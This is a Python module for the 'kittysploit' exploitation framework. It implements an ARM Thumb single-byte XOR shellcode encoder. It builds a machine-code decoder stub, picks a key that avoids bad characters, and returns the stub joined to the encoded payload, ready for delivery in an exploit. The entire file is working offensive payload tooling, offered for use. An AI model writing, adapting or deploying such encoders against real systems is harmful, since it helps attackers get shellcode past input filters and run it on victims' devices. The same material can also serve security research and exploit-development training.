#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Thumb ARM little-endian single-byte XOR encoder."""

import re

from kittysploit import *


class Module(Encoder):
    __info__ = {
        "name": "ARM LE Thumb XOR Encoder",
        "description": (
            "Prepends a compact Thumb decoder stub and XOR-encodes raw ARM little-endian "
            "payload bytes with a one-byte key."
        ),
        "author": "KittySploit Team",
        "arch": Arch.ARM,
        "platform": Platform.LINUX,
    }

    xor_key = OptString("auto", "XOR key byte: auto, 0x41, \\x41, 41, or A", False)
    badchars = OptString("\\x00", "Bad characters to avoid, e.g. \\x00\\x0a", False)

    def encode(self, payload):
        payload = self._to_bytes(payload)
        if not payload:
            raise ValueError("payload is empty")
        if len(payload) > 255:
            raise ValueError("ARMLE XOR encoder supports payloads up to 255 bytes")

        badchars = self._parse_badchars(str(self.badchars or ""))
        key = self._select_key(payload, badchars)
        stub = self._decoder_stub(len(payload), key)
        encoded = self._xor(payload, key)

        if badchars and any(b in badchars for b in stub + encoded):
            raise ValueError("encoded payload still contains bad characters")

        return stub + encoded

    @staticmethod
    def _to_bytes(payload) -> bytes:
        if isinstance(payload, bytes):
            return payload
        if isinstance(payload, bytearray):
            return bytes(payload)
        if isinstance(payload, str):
            return payload.encode("latin-1", errors="replace")
        return bytes(payload)

    @staticmethod
    def _parse_badchars(raw: str) -> set[int]:
        if not raw:
            return set()

        out = set()
        for item in re.findall(r"\\x([0-9a-fA-F]{2})", raw):
            out.add(int(item, 16))
        for item in re.findall(r"\b([0-9a-fA-F]{2})\b", raw):
            out.add(int(item, 16))

        stripped = re.sub(r"\\x[0-9a-fA-F]{2}", "", raw)
        stripped = re.sub(r"\b[0-9a-fA-F]{2}\b", "", stripped)
        for ch in stripped:
            if ch and ch not in (" ", "\t", "\r", "\n"):
                out.add(ord(ch))
        return out

    @staticmethod
    def _parse_key(raw: str) -> int | None:
        value = str(raw or "").strip()
        if not value or value.lower() == "auto":
            return None
        if value.startswith("\\x") and len(value) == 4:
            return int(value[2:], 16)
        if value.lower().startswith("0x"):
            return int(value, 16)
        if len(value) == 2 and all(c in "0123456789abcdefABCDEF" for c in value):
            return int(value, 16)
        if len(value) == 1:
            return ord(value)
        raise ValueError("xor_key must be auto, one byte, or a hex byte")

    @staticmethod
    def _xor(payload: bytes, key: int) -> bytes:
        return bytes(byte ^ key for byte in payload)

    @staticmethod
    def _decoder_stub(payload_len: int, key: int) -> bytes:
        if payload_len < 1 or payload_len > 255:
            raise ValueError("payload length must fit in a Thumb movs immediate")
        if key < 1 or key > 255:
            raise ValueError("xor key must be between 1 and 255")

        return (
            b"\x05\xa4"              # adr r4, payload_start
            + bytes([payload_len])
            + b"\x25"                # movs r5, payload_len
            + bytes([key])
            + b"\x26"                # movs r6, key
            b"\x23\x1c"              # adds r3, r4, #0
            b"\x27\x78"              # ldrb r7, [r4]
            b"\x77\x40"              # eors r7, r6
            b"\x27\x70"              # strb r7, [r4]
            b"\x01\x34"              # adds r4, #1
            b"\x01\x3d"              # subs r5, #1
            b"\xf9\xd1"              # bne decode_loop
            b"\x18\x47"              # bx r3
            b"\xc0\x46"              # nop; aligns payload_start for adr
        )

    def _select_key(self, payload: bytes, badchars: set[int]) -> int:
        requested = self._parse_key(str(self.xor_key or "auto"))
        candidates = [requested] if requested is not None else range(1, 256)

        for key in candidates:
            if key is None or key < 1 or key > 255:
                continue
            stub = self._decoder_stub(len(payload), key)
            encoded = self._xor(payload, key)
            if badchars and any(b in badchars for b in stub + encoded):
                continue
            return key

        raise ValueError("no valid XOR key found for the configured badchars")

